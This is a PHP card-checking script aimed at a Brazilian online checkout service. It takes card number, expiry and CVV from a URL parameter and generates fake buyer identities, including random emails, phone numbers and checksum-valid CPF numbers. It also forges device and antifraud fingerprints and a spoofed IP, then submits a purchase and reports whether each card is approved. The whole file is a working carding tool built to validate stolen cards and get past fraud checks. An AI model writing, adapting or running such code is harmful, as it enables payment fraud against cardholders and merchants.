<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: text/plain; charset=utf-8');

sleep(6);

define('BASE_URL', 'https://pay.cakto.com.br');
define('API_URL', 'https://api.cakto.com.br');
define('PRODUCT_ID', '34ihrq8');
define('CHECKOUT_ID', '3GKj4Zx');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36');

$lista = $_GET['lista'] ?? '';
if (empty($lista)) die("ERRO: Use ?lista=NUMERO|MES|ANO|CVV\n");
$parts = explode('|', $lista);
$cardNumber = preg_replace('/[^0-9]/', '', $parts[0] ?? '');
$expMonth = str_pad($parts[1] ?? '', 2, '0', STR_PAD_LEFT);
$expYearRaw = $parts[2] ?? '';
$cvv = $parts[3] ?? '';
if (empty($cardNumber) || empty($expMonth) || empty($expYearRaw) || empty($cvv)) {
    die("ERRO: Dados inválidos. Use: numero|mes|ano|cvv\n");
}
if (strlen($expYearRaw) == 2) $expYear = 2000 + (int)$expYearRaw;
else $expYear = (int)$expYearRaw;
$cardString = "{$cardNumber}|{$expMonth}|{$expYear}|{$cvv}";

function randomEmail() {
    $domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com"];
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 10) . '@' . $domains[array_rand($domains)];
}

function randomPhone() {
    $ddds = ["11","21","31","41","51","61","71","81","91"];
    $ddd = $ddds[array_rand($ddds)];
    return ["ddd" => $ddd, "number" => "9" . rand(7000,9999) . rand(1000,9999)];
}

function randomCPF() {
    $n = array_map(fn() => rand(0,9), range(1,9));
    for($i=9;$i<11;$i++){
        $s=0; for($c=0;$c<$i;$c++) $s+=$n[$c]*(($i+1)-$c);
        $n[$i]=((10*$s)%11)%10;
    }
    return implode('',$n);
}

function randomUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0,0xffff), mt_rand(0,0xffff),
        mt_rand(0,0xffff),
        mt_rand(0,0x0fff)|0x4000,
        mt_rand(0,0x3fff)|0x8000,
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff));
}

function httpRequest($url, $method = 'GET', $data = null, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($data) ? json_encode($data) : $data);
        }
    }
    if (!empty($headers)) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) throw new Exception("cURL Error: $error");
    return ['body' => $response, 'http_code' => $httpCode];
}

$customerName = "Cliente Teste";
$randomEmail = randomEmail();
$randomPhone = randomPhone();
$customerDoc = randomCPF();
$fingerprint = (string)rand(1000000000, 9999999999);
$sessionId = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 20);
$attemptRef = randomUUID();
$deviceId = 'armor.' . bin2hex(random_bytes(50)) . '.' . bin2hex(random_bytes(16));

try {
    $tokenUrl = API_URL . '/api/financial/3ds/token/?provider=pagarme';
    $tokenResp = httpRequest($tokenUrl, 'GET', null, [
        'Accept: application/json, text/plain, */*',
        'Origin: ' . BASE_URL,
        'Referer: ' . BASE_URL . '/'
    ]);
    
    if ($tokenResp['http_code'] !== 200) {
        throw new Exception("Falha token: " . $tokenResp['body']);
    }
    $dataToken = json_decode($tokenResp['body'], true);
    $tdsToken = null;
    if (is_array($dataToken)) {
        $rawString = implode("", $dataToken);
        $parsed = json_decode($rawString, true);
        $tdsToken = $parsed["tds_token"] ?? null;
    }
    if (!$tdsToken) throw new Exception("tds_token não encontrado");
    
    $paymentData = [
        'customer' => [
            'docNumber' => $customerDoc,
            'email' => $randomEmail,
            'fingerprint' => $fingerprint,
            'docType' => 'cpf',
            'name' => $customerName,
            'phone' => '55' . $randomPhone['ddd'] . $randomPhone['number']
        ],
        'paymentMethod' => 'credit_card',
        'items' => [['id' => PRODUCT_ID, 'offerType' => 'main', 'installments' => 1]],
        'metadata' => ['ip' => '123.123.123.84', 'country' => 'br', 'sessionid' => $sessionId],
        'type' => 'product',
        'refererUrl' => '',
        'antifraud_profiling_attempt_reference' => $attemptRef,
        'deviceId' => $deviceId,
        'card' => [
            'holderName' => $customerName,
            'number' => $cardNumber,
            'expMonth' => $expMonth,
            'expYear' => (string)$expYear,
            'cvv' => $cvv
        ],
        'saveCard' => false,
        'checkoutUrl' => BASE_URL . '/' . PRODUCT_ID . '_665006'
    ];
    
    $checkoutUrl = API_URL . '/api/checkout/' . CHECKOUT_ID . '/';
    $checkoutHeaders = [
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json',
        'Origin: ' . BASE_URL,
        'Referer: ' . BASE_URL . '/'
    ];
    $checkoutResp = httpRequest($checkoutUrl, 'POST', $paymentData, $checkoutHeaders);
    $responseJson = json_decode($checkoutResp['body'], true);
    
    if (!$responseJson) {
        echo "❌ {$cardString} --> Resposta inválida do servidor\n";
        exit(1);
    }
    
    if (isset($responseJson['payments'][0]['status'])) {
        $status = $responseJson['payments'][0]['status'];
        if ($status === 'refused') {
            $payment = $responseJson['payments'][0];
            $reason = $payment['orders'][0]['reason'] ?? $payment['reason'] ?? 'Pagamento recusado';
            $returnCode = $payment['return_code'] ?? $payment['merchant_advice_code'] ?? 'N/A';
            echo "❌ {$cardString} --> reason: \"{$reason}\", return_code: \"{$returnCode}\"\n";
        } elseif ($status === 'authorized') {
            echo "✅ {$cardString} --> APROVADO\n";
        } else {
            echo "❌ {$cardString} --> Status: {$status}\n";
        }
        exit(0);
    }
    
    echo "❌ {$cardString} --> Resposta inesperada\n";
    
} catch (Exception $e) {
    echo "❌ {$cardString} --> Erro: " . $e->getMessage() . "\n";
    exit(1);
}
?>